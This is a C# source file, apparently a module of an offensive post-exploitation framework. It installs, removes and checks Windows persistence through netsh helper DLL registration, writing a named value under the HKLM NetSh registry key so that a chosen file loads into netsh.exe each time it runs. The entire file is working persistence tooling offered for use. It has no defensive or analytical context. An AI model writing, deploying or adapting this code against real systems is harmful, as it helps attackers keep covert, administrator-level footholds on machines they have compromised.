using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"SOFTWARE\Microsoft\NetSh";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultName = "{R2-117}";
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 netsh_dlls Start {defaultName} {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string name = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (regKey == null)
                    return "[-] Access denied opening NetSh registry key. Run as administrator.";

                var existing = regKey.GetValue(name);

                if (existing != null)
                    return $"[*] Netsh helper '{name}' already registered.";

                regKey.SetValue(name, payloadPath);

                return $"[+] Installed netsh helper '{name}' -> '{payloadPath}'. " +
                       $"DLL will load into netsh.exe on next execution.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Netsh helper registration requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string name = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (regKey == null)
                    return "[-] Access denied opening NetSh registry key. Run as administrator.";

                var existing = regKey.GetValue(name);

                if (existing == null)
                    return $"[*] Netsh helper '{name}' not found.";

                regKey.DeleteValue(name);

                return $"[+] Removed netsh helper '{name}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Netsh helper registration requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string name = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);

                if (regKey == null)
                    return "[-] Access denied opening NetSh registry key. Run as administrator.";

                var value = regKey.GetValue(name)?.ToString();

                if (value == null)
                    return $"[*] Netsh helper '{name}' not found.";

                return $"[+] Verified netsh helper '{name}' -> '{value}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Netsh helper registration requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during verification: {ex.Message}";
            }
        }
    }
}